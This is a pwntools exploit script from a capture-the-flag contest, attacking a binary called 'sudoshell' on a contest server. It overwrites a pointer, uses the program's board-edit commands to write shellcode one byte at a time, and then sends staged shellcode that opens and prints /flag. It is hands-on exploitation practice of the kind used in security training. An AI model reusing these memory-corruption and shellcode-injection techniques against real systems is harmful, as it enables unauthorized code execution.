#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 5555
HOST = "pwn3.cscv.vn"
exe = context.binary = ELF('./sudoshell', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            b* 0x0000000000401C77
            b* 0x0000000000401C9C
            b* 0x0000000000401CF5
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

# VARIABLE
board = 0x4040e0
main = exe.sym.main
printf_got = exe.got.printf

# PAYLOAD
p.sendlineafter(b'> ', str(1))

rw_section = 0x404280
payload = b'1'*0x20 + p64(0x4041b0 - 8)[:-1]
p.sendafter(b'? ', payload)

# 0x4040f5 <BOARD+21>          call   qword ptr [rsp + 0x5]       <0x4041c5>
p.sendlineafter(b'> ', b'3 4 255')
p.sendlineafter(b'> ', b'3 5 84')

p.sendlineafter(b'> ', b'3 6 36')
p.sendlineafter(b'> ', b'3 7 5')

# 255 - 45 = 0xd2
# 0x4041b0 -> 0x4040f5
p.sendlineafter(b'> ', b'1 -45 64')
p.sendlineafter(b'> ', b'1 -46 64')
p.sendlineafter(b'> ', b'1 -47 245')

# 0x4041bd -> 0x4041c5
p.sendlineafter(b'> ', b'1 -32 64')
p.sendlineafter(b'> ', b'1 -33 65')
p.sendlineafter(b'> ', b'1 -34 197')

# 0x4041c5    mov    edx, 0x100
p.sendlineafter(b'> ', b'1 -26 72')
p.sendlineafter(b'> ', b'1 -25 199')
p.sendlineafter(b'> ', b'1 -24 194')
p.sendlineafter(b'> ', b'1 -23 0')
p.sendlineafter(b'> ', b'1 -22 1')
p.sendlineafter(b'> ', b'1 -21 0')
p.sendlineafter(b'> ', b'1 -20 0')

# 0x4041cc    mov    rsi, rsp
p.sendlineafter(b'> ', b'1 -19 72')
p.sendlineafter(b'> ', b'1 -18 137')
p.sendlineafter(b'> ', b'1 -17 230')

# 0x4041cf    mov    rdi, rax
p.sendlineafter(b'> ', b'1 -16 72')
p.sendlineafter(b'> ', b'1 -15 137')
p.sendlineafter(b'> ', b'1 -14 199')

# 0x4041d2    syscall  <SYS_read>
p.sendlineafter(b'> ', b'-240 -147 5')
p.sendlineafter(b'> ', b'1 -13 15')

p.sendlineafter(b'> ', b'0 0 0')

flag = 0x4041b0
payload = b'/flag\0'
payload = payload.ljust(0x24,b'\0')

# 0x4041d4
shellcode = asm(f'''
    mov rdi, {flag}
    mov rsi, 0
    mov rdx, 0
    mov rax, 2
    syscall

    mov rdi, rax
    mov rsi, {rw_section}
    mov rdx, 0x50
    mov rax, 0
    syscall

    mov rdi, 1
    mov rsi, {rw_section}
    mov rdx, 0x50
    mov rax, 0x1
    syscall
    ''', arch= 'amd64')
payload += shellcode
p.send(payload)

p.interactive()